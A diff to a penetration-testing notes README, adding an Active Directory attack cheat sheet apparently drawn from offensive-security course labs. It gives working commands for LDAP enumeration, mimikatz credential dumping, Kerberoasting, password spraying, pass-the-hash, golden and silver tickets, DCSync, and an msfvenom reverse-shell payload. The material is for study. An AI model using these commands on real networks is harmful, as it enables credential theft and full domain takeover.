@@ -160,6 +160,13 @@ EasyG started out as a script that I use to automate some information gathering 
   - [Plix.exe](#plixexe)
   - [Netsh](#netsh)
   - [HTTPTunnel-ing through Deep Packet Inspection](#httptunnel-ing-through-deep-packet-inspection)
+- [Active Directory Attacks](#active-directory-attacks)
+  - [Enumeration](#enumeration)
+  - [Authentication](#authentication)
+  - [Lateral Movement](#lateral-movement)
+  - [Persistence](#persistence)
+
+
 
 ## Resources
 
@@ -3557,3 +3564,165 @@ Note: HTTPTunnel uses both a client (`htc`) and a server (`hts`)
    - `htc --forward-port 8080 10.11.0.128:1234`
    - `ps aux | grep htc`
    - `ss -antp | grep "8080"`
+
+
+
+## Active Directory Attacks
+
+See also [Cheat Sheet - Active Directory](https://github.com/drak3hft7/Cheat-Sheet---Active-Directory)
+
+### <ins>Enumeration</ins>
+
+#### Traditional Approach
+
+```
+net user                           enumerates all local accounts
+net user /domain                   enumerate all users in the entire domain
+net user <target user> /domain     against a specific user
+net group /domain                  enumerate groups
+```
+
+#### Basic PowerShell Script
+
+```PowerShell
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$SearchString += $DistinguishedName
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+$Searcher.SearchRoot = $objDomain
+$Searcher.filter="samAccountType=805306368"
+$Searcher.FindAll()
+Foreach($obj in $Result) {
+  Foreach($prop in $obj.Properties) {
+    $prop
+  }
+   Write-Host "------------------------"
+}
+```
+Use `$Searcher.filter="name=<target user>"` to filter the results
+
+#### Resolving Nested Groups
+
+- Enumerate all domain groups
+  ```PowerShell
+  $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+  $PDC = ($domainObj.PdcRoleOwner).Name
+  $SearchString = "LDAP://"
+  $SearchString += $PDC + "/"
+  $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+  $SearchString += $DistinguishedName
+  $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+  $objDomain = New-Object System.DirectoryServices.DirectoryEntry
+  $Searcher.SearchRoot = $objDomain
+  $Searcher.filter="(objectClass=Group)"
+  $Result = $Searcher.FindAll()
+  Foreach($obj in $Result) {
+  	$obj.Properties.name
+  }
+  ```
+- Enumerate group members
+  - Change the filter of the script in something like `$Searcher.filter="(name=Secret_Group)"`, `Secret_Group` is the target
+
+#### Currently logged on user
+
+With [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+- `PS C:\> Import-Module .\PowerView.ps1` import PowerView.ps1
+- `PS C:\> Get-NetLoggedon -ComputerName client251` user enumeration using Get-NetLoggedon
+- `PS C:\> Get-NetSession -ComputerName dc01` enumerate active user sessions with Get-NetSession
+
+#### Enumeration through service principal names
+
+1. Modify the script at [Resolving Nested Groups](#resolving-nested-groups), `$Searcher.filter="(objectClass=Group)"` with `$Searcher.filter="serviceprincipalname=*http*"`
+2. Resolve the result with `nslookup`
+
+### <ins>Authentication</ins>
+
+NTLM Authentication
+- It's possible to use a cracking software like [Hashcat](https://hashcat.net/hashcat/)
+- See also: [NTLM user authentication | Microsoft](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/ntlm-user-authentication) and [NTLM authentication: What it is and why you should avoid using it](https://blog.quest.com/ntlm-authentication-what-it-is-and-why-you-should-avoid-using-it/)
+
+Kerberos Authentication
+-  Default authentication protocol in Active Directory and for associated services
+-  See also: [Kerberos Authentication Overview | Microsoft](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)
+
+#### Cached credential storage and retrieval
+
+From mimikatz
+1. `mimikatz # privilege::debug` to engage the [SeDebugPrivlege](https://msdn.microsoft.com/en-us/library/windows/desktop/bb530716(v=vs.85).aspx)
+2. `mimikatz # sekurlsa::logonpasswords` to dump the credentials of all logged-on users using the [Sekurlsa](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa) module
+3. `sekurlsa::tickets` extract Kerberos tickets
+
+Note: use an injector, such as PowerShell, to run Mimikatz directly from memory, or use Task Manager to dump the contents of the whole LSASS process memory, transfer the data to a helper machine, and then load the data into Mimikatz.
+
+#### Service account attacks
+
+1. `PS C:\> klist` display all cached Kerberos tickets for the current user
+2. `mimikatz # kerberos::list /export` download the service ticket, specify the `/export` flag to download to disk
+3. Perform a wordlist attack with `tgsrepcrack.py`
+   - Example `python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi`
+
+#### Low and Slow Password Guessing
+
+Authenticating using DirectoryEntry
+```PowerShell
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$SearchString += $DistinguishedName
+New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qwert
+y09!")
+```
+
+See: [Spray-Passwords.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/modules/Spray-Passwords.ps1)
+- Usage: `.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin`. Test admin accounts with `-Admin`
+
+### <ins>Lateral Movement</ins>
+
+#### Pass the Hash
+
+- [PSExec Pass the Hash](https://www.offsec.com/metasploit-unleashed/psexec-pass-hash/)
+  - `pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd`
+- [Passing-the-hash toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
+- [Impacket](https://github.com/fortra/impacket)
+
+#### Overpass the Hash
+
+[Abusing Microsoft Kerberos | BlackHat](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf)
+
+Turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication
+1. `sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe` create a process with a different users NTLM password hash
+2. Use `net use \\dc01` and `klist` to map a network share on the domain controller and list Kerberos tickets
+3. `.\PsExec.exe \\dc01 cmd.exe` open remote connection using Kerberos
+   - Confirm it with the commands `ipconfig` and `whoami`
+
+#### Pass the Ticket (Sliver Ticket)
+
+To create a ticket, you need the SID of the domain. This can be done with the command `whoami /user`. With the SID, you can now craft a Silver Ticket.
+1. `kerberos::purge` flush any existing Kerberos ticket and verify the purge with `kerberos::list`
+2. Craft the silver ticket with `kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt`
+3. Verify the new ticket with `kerberos::list`
+
+#### Distributed Component Object Model (DCOM)
+
+1. `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.213 LPORT=4444 -f hta-psh -o evil.hta`
+2. Split the payload and create a macro, see [microsoft-office](#microsoft-office)
+3. Set a listener with netcat and get the reverse shell
+
+### <ins>Persistence</ins>
+
+#### Golden Tickets
+
+1. Obtain krbtgt password hash with mimikatz and the commands `privilege::debug` & `lsadump::lsa /patch`
+2. `kerberos::purge` flush any existing Kerberos ticket and verify the purge with `kerberos::list`
+3. Craft the silver ticket with ` kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt`
+4. Verify the new ticket with `kerberos::list`
+
+#### Domain Controller Synchronization
+
+Log in as admin and perform a replication
+- With mimikatz, `lsadump::dcsync /user:Administrator` replicate the target specified with `/user:`
+- Notice how you are able to dump the hashes, see `Credentials` > `Hash NTLM`
